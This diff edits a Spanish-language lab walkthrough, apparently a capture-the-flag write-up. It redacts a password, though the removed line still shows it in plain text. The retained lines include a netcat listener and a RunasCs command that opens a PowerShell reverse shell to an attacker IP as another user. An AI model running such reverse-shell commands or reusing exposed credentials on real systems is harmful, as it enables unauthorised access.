@@ -310,7 +310,7 @@ nc -nlvp 5555
 Ejecutamos RunasCs pasándole las credenciales de web_svc para que nc.exe nos envíe una shell reversa. Si todo funciona, recibiremos la conexión como el usuario web_svc.
 
 ```powershell
-PS C:\Users\monitoring_svc\Documents> .\RunasCs.exe web_svc "dksehdgh712!@#" "C:\Windows\Temp\nc.exe 10.10.15.7 5555 -e powershell.exe"
+PS C:\Users\monitoring_svc\Documents> .\RunasCs.exe web_svc "[REDACTED]" "C:\Windows\Temp\nc.exe 10.10.15.7 5555 -e powershell.exe"
 ```
 
 Verificamos la identidad con whoami para confirmar que ahora estamos ejecutándonos en el contexto de web_svc, listos para el siguiente paso de la escalada.
